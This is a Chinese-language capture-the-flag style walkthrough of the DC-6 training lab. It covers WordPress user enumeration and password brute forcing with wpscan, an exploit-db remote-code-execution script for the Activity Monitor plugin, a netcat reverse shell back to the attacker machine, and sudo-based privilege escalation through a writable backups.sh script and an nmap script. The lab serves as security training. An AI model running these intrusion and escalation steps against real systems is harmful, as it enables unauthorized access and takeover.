---
title: DC-6靶场练习
date: 2021-12-24 15:05:43
tags: DC靶场系列
cover: https://raw.githubusercontent.com/todis21/image/main/img/wallhaven-mpx5m8_1920x1080.png
---

# DC-6靶场练习

## 环境

kali:192.168.10.128

dc-6: 192.168.10.174

## 信息收集

```
nmap 192.168.10.0/24
```

<img src="https://raw.githubusercontent.com/todis21/image/main/img/image-20211224152919978.png" alt="image-20211224152919978" style="zoom:150%;" />

这里可以看到靶机已经开了22端口和80端口

再用下面命令查看是否还开着其他端口

![image-20211224153405661](https://raw.githubusercontent.com/todis21/image/main/img/image-20211224153405661.png)



打开web端，打开`http://192.168.10.174/`,发现网页会跳转到`http://wordy/`并且打不开

<img src="https://raw.githubusercontent.com/todis21/image/main/img/image-20211224153757108.png" alt="image-20211224153757108" style="zoom:80%;" />

修改hosts文件，在文件里面添加

```
192.168.10.174 wordy
```



![image-20211224154009380](https://raw.githubusercontent.com/todis21/image/main/img/image-20211224154009380.png)

修改后保存，重新打开`http://wordy/`

![image-20211224154113236](https://raw.githubusercontent.com/todis21/image/main/img/image-20211224154113236.png)

打开成功

这是个WordPress的站点，`WordPress 5.1.1`

![image-20211224154354895](https://raw.githubusercontent.com/todis21/image/main/img/image-20211224154354895.png)

## 目录扫描

```
dirb http://wordy/
```

![image-20211224154743386](https://raw.githubusercontent.com/todis21/image/main/img/image-20211224154743386.png)

找到了后台登录的目录

```
http://wordy/wp-admin/
```

![image-20211224154933030](https://raw.githubusercontent.com/todis21/image/main/img/image-20211224154933030.png)

## 爆破后台账号密码

通过wpscan爆破后台用户名

```
wpscan --url http://wordy/ -e u
```



![image-20211224170856976](https://raw.githubusercontent.com/todis21/image/main/img/image-20211224170856976.png)

```
admin mark graham sarah jens
```

将其保存在user.txt中

![image-20211224173400687](https://raw.githubusercontent.com/todis21/image/main/img/image-20211224173400687.png)

有密码，还需要密码

作者为了降低难度，在vulhub给出了提示:dc-6的字典是可以被筛检的，可以大大减少我们爆破的时间。

![image-20211224174546662](https://raw.githubusercontent.com/todis21/image/main/img/image-20211224174546662.png)

```
zcat /usr/share/wordlists/rockyou.txt.gz | grep k01 > password.txt
```

运行命令后得到的字典如下

![image-20211225133149850](https://raw.githubusercontent.com/todis21/image/main/img/image-20211225133149850.png)

然后就是爆破:

```
wpscan --url http://wordy/ -P password.txt -U user.txt
```

获得账号密码:   mark / helpdesk01

<img src="https://raw.githubusercontent.com/todis21/image/main/img/image-20211225134221550.png" alt="image-20211225134221550" style="zoom:150%;" />

登录后台：

![image-20211225134635757](https://raw.githubusercontent.com/todis21/image/main/img/image-20211225134635757.png)

## 漏洞利用

来到后台后，发现插件activity monitor，并且它的功能是记录各用户的操作记录

盲猜这个插件存在漏洞

寻找这个插件的漏洞脚本，能找到说明真的是存在漏洞

```
searchsploit activity monitor 
```

![image-20211225204259319](https://raw.githubusercontent.com/todis21/image/main/img/image-20211225204259319.png)

找到一个RCE的脚本，即第四条:

```
WordPress Plugin Plainview Activity Monitor 20161228 - Remote Code Execution (RCE) (Authenticated) (2) | php/webapps/50110.py
```

尝试利用这个脚本

先找到这个脚本的路径

```
find / -name 50110.py
```

得到路径

```
/usr/share/exploitdb/exploits/php/webapps/50110.py
```

执行脚本:

```
python3 /usr/share/exploitdb/exploits/php/webapps/50110.py
```

执行后需要输入目标ip地址和后台登录的账号密码，执行成功后会返回一个shell

![image-20211225204944700](https://raw.githubusercontent.com/todis21/image/main/img/image-20211225204944700.png)



拿到shell后，进行反弹shell到kali

```
kali：nc -lvvp 1234
dc-6: nc -e /bin/bash 192.168.10.128 1234
连接成功后改善一下交互交互界面
kali: python -c 'import pty;pty.spawn("/bin/bash")'
```

![image-20211225205500667](https://raw.githubusercontent.com/todis21/image/main/img/image-20211225205500667.png)

![image-20211225205508943](https://raw.githubusercontent.com/todis21/image/main/img/image-20211225205508943.png)

反弹shell成功后，就是寻找提权线索

来到home目录，在mark/stuff中找到一个things-to-do.txt,内容如下：

```
Things to do:

- Restore full functionality for the hyperdrive (need to speak to Jens)
- Buy present for Sarah's farewell party
- Add new user: graham - GSo7isUM1D4 - done
- Apply for the OSCP course
- Buy new laptop for Sarah's replacement
```

在这里可以知道另一个用户的账号密码：

```
graham  / GSo7isUM1D4
```

切换用户

```
su graham
```

<img src="https://raw.githubusercontent.com/todis21/image/main/img/image-20211225211453645.png" alt="image-20211225211453645" style="zoom: 200%;" />

然后在/home/jens中找到一个backups.sh,内容是

```
#!/bin/bash
tar -czf backups.tar.gz /var/www/html
```

大概的意思是对web的文件进行打包备份

查看该用户能执行的操作

```
sudo -l
```

![image-20211225213635814](https://raw.githubusercontent.com/todis21/image/main/img/image-20211225213635814.png)

可以看到该用户可以执行backups.sh

向backups.sh文件中写入”/bin/bash”，并以jens用户去执行该脚本

```
echo "/bin/bash" >> backups.sh
sudo -u jens ./backups.sh
```

![image-20211225215649548](https://raw.githubusercontent.com/todis21/image/main/img/image-20211225215649548.png)

执行成功后，切换到了jens用户

查看这个用户可以执行的操作

```
sudo -l
```

![image-20211225220346275](https://raw.githubusercontent.com/todis21/image/main/img/image-20211225220346275.png)

该用户可以执行nmap,可以通过namp提权

```
echo 'os.execute("/bin/sh")' >getShell
sudo nmap --script=getShell
```

![image-20211225221642374](https://raw.githubusercontent.com/todis21/image/main/img/image-20211225221642374.png)

提权成功，寻找flag,按照dc靶场的惯例，flag在root文件夹下

```
cd /root
ls
cat theflag.txt
```

![image-20211225221826625](https://raw.githubusercontent.com/todis21/image/main/img/image-20211225221826625.png)

